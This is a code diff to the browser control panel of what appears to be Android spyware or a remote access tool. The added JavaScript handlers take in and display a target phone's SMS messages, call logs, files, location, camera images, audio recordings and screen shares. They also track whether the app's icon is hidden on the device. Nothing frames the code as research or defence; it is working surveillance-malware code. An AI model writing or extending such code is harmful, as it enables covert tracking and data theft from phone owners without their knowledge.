@@ -381,15 +381,186 @@
     }
 
     // ---------- EXISTING HANDLERS (unchanged) ----------
-    function handleJSON(json) {
-        // Keep your existing handleJSON function from previous version
-        // (SMS_DATA, CALL_LOGS, FILE_LIST, LOCATION_UPDATE, CAMERA_IMAGE, etc.)
-        // For brevity, I'm not repeating it here. Use the one from your current file.
+   function handleJSON(json) {
+        console.log('handleJSON:', json.type, json);
+        switch (json.type) {
+            case 'SMS_DATA':
+                console.log('📩 SMS_DATA received', json.data);
+                dataType = 'sms';
+                currentData = json.data;
+                renderTable();
+                pendingCommand = null;
+                break;
+            case 'CALL_LOGS':
+                dataType = 'call';
+                currentData = json.data;
+                renderTable();
+                pendingCommand = null;
+                break;
+            case 'FILE_LIST':
+                dataType = 'file';
+                currentData = json.data;
+                renderFiles();
+                pendingCommand = null;
+                break;
+            case 'LOCATION_UPDATE':
+                renderMap(json.data);
+                pendingCommand = null;
+                break;
+            case 'CAMERA_IMAGE':
+                displayCapturedImage(json.data);
+                pendingCommand = null;
+                break;
+            case 'AUDIO_RECORDING':
+                showAudio(json.data);
+                pendingCommand = null;
+                break;
+            case 'ERROR':
+                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
+                pendingCommand = null;
+                break;
+            case 'DEVICE_STATUS':
+                setStatus(json.status);
+                pendingCommand = null;
+                break;
+            case 'APP_HIDDEN':
+                iconHidden = true;
+                document.getElementById('iconBtn').innerText = 'Show Icon';
+                showNotification('App icon hidden');
+                pendingCommand = null;
+                break;
+            case 'APP_SHOWN':
+                iconHidden = false;
+                document.getElementById('iconBtn').innerText = 'Hide Icon';
+                showNotification('App icon shown');
+                pendingCommand = null;
+                break;
+            case 'SCREEN_SHARE_STARTED':
+                screenActive = true;
+                document.getElementById('screenBtn').innerText = 'Stop Screen';
+                showNotification('Screen share started');
+                pendingCommand = null;
+                break;
+            case 'SCREEN_SHARE_STOPPED':
+                screenActive = false;
+                document.getElementById('screenBtn').innerText = 'Start Screen';
+                if (screenPC) { screenPC.close(); screenPC = null; }
+                showNotification('Screen share stopped');
+                pendingCommand = null;
+                break;
+            case 'ROOM_CREATED':
+                // Android created a room, join it
+                if (json.roomId) joinFirebaseRoom(json.roomId);
+                pendingCommand = null;
+                break;
+            default:
+                console.log('Unhandled JSON type:', json.type);
+                // If we have a pending command, try to infer the response format
+                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
+                    dataType = 'file';
+                    currentData = json;
+                    renderFiles();
+                    pendingCommand = null;
+                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
+                    dataType = 'sms';
+                    currentData = json;
+                    renderTable();
+                    pendingCommand = null;
+                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
+                    dataType = 'call';
+                    currentData = json;
+                    renderTable();
+                    pendingCommand = null;
+                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
+                    renderMap(json);
+                    pendingCommand = null;
+                }
+                break;
+        }
     }
 
     function handlePlainText(msg) {
-        // Keep your existing handlePlainText function
+        if (msg.startsWith("STATUS:")) {
+            setStatus(msg.substring(7));
+            pendingCommand = null;
+        } else if (msg.startsWith("LOC_DATA:")) {
+            try {
+                const data = JSON.parse(msg.substring(9));
+                renderMap(data);
+                pendingCommand = null;
+            } catch (err) { console.error(err); }
+        } else if (msg.startsWith("FILE_LIST:")) {
+            try {
+                currentData = JSON.parse(msg.substring(10));
+                dataType = 'file';
+                renderFiles();
+                pendingCommand = null;
+            } catch (err) { console.error(err); }
+        } else if (msg.startsWith("SMS_DATA:")) {
+            try {
+                currentData = JSON.parse(msg.substring(9));
+                dataType = 'sms';
+                renderTable();
+                pendingCommand = null;
+            } catch (err) { console.error(err); }
+        } else if (msg.startsWith("CALL_DATA:")) {
+            try {
+                currentData = JSON.parse(msg.substring(10));
+                dataType = 'call';
+                renderTable();
+                pendingCommand = null;
+            } catch (err) { console.error(err); }
+        } else if (msg.startsWith("CAMERA_IMAGE:")) {
+            const base64 = msg.substring(13);
+            displayCapturedImage(base64);
+            pendingCommand = null;
+        } else if (msg.startsWith("AUDIO_RECORDING:")) {
+            showAudio(msg.substring(16));
+            pendingCommand = null;
+        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
+            screenActive = true;
+            document.getElementById('screenBtn').innerText = 'Stop Screen';
+            showNotification('Screen share started');
+            pendingCommand = null;
+        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
+            screenActive = false;
+            document.getElementById('screenBtn').innerText = 'Start Screen';
+            if (screenPC) { screenPC.close(); screenPC = null; }
+            showNotification('Screen share stopped');
+            pendingCommand = null;
+        } else if (msg.startsWith("APP_HIDDEN")) {
+            iconHidden = true;
+            document.getElementById('iconBtn').innerText = 'Show Icon';
+            showNotification('App icon hidden');
+            pendingCommand = null;
+        } else if (msg.startsWith("APP_SHOWN")) {
+            iconHidden = false;
+            document.getElementById('iconBtn').innerText = 'Hide Icon';
+            showNotification('App icon shown');
+            pendingCommand = null;
+        } else if (msg.startsWith("VIBRATE_DONE")) {
+            showNotification('Vibration done');
+            pendingCommand = null;
+        } else if (msg.startsWith("ERROR:")) {
+            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
+            pendingCommand = null;
+        } else if (msg.startsWith("FILE_DATA:")) {
+            const base64 = msg.substring(10);
+            downloadBase64(base64, 'downloaded_file');
+            pendingCommand = null;
+        } else if (msg.startsWith('[') || msg.startsWith('{')) {
+            // Try to parse as JSON (raw response from device)
+            try {
+                const parsed = JSON.parse(msg);
+                handleJSON(parsed);
+            } catch (err) {
+                console.error('Failed to parse JSON in plain text:', err);
+            }
+        } else {
+            console.log('Unhandled plain text:', msg);
+        }
     }
+
 
     // ---------- WEBSOCKET CONNECTION ----------
     function connectWebSocket() {
@@ -444,5 +615,6 @@
 </script>
 </body>
 </html>
+
 
 
